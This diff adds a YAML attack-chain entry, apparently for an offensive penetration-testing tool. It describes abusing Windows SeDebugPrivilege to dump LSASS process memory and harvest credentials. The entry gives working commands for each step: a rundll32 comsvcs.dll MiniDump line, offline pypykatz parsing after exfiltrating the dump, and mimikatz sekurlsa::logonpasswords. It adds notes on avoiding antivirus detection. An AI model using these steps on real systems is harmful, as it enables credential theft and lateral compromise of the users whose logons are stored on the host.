@@ -1,0 +1,43 @@
+chain_id: sedebug_lsass_dump
+title: "Windows privesc — SeDebugPrivilege to dump LSASS for cached creds"
+severity: CRITICAL
+tags: [windows, privesc, sedebug, lsass, mimikatz, secrets]
+
+trigger:
+  any_of:
+    - { kind: "windows-privilege", banner_pattern: "(?i)SeDebugPrivilege" }
+
+description: |
+  SeDebugPrivilege grants OpenProcess on any process — including LSASS,
+  which holds cleartext or NTLM credentials of every interactive logon
+  on the box. Two paths: mimikatz `sekurlsa::logonpasswords` for
+  cleartext + tickets, or a process minidump pulled to Kali for offline
+  pypykatz parsing.
+
+steps:
+  - id: 1
+    title: "Local LSASS dump with Task Manager (no AV touchpoint)"
+    notes: |
+      Task Manager → LSASS → right-click → Create dump file. Saves to
+      %TEMP%\lsass.DMP. Works without dropping any tooling on disk.
+
+  - id: 2
+    title: "Or with rundll32 if the GUI is unavailable"
+    command: |
+      rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Public\lsass.dmp full
+
+  - id: 3
+    title: "Exfiltrate the dump and parse offline (no mimikatz on box)"
+    command: |
+      # Kali side:
+      pip3 install pypykatz
+      pypykatz lsa minidump lsass.dmp
+
+  - id: 4
+    title: "Or run mimikatz live (caught by every modern AV)"
+    command: |
+      mimikatz # privilege::debug
+      mimikatz # sekurlsa::logonpasswords
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/sedebugprivilege
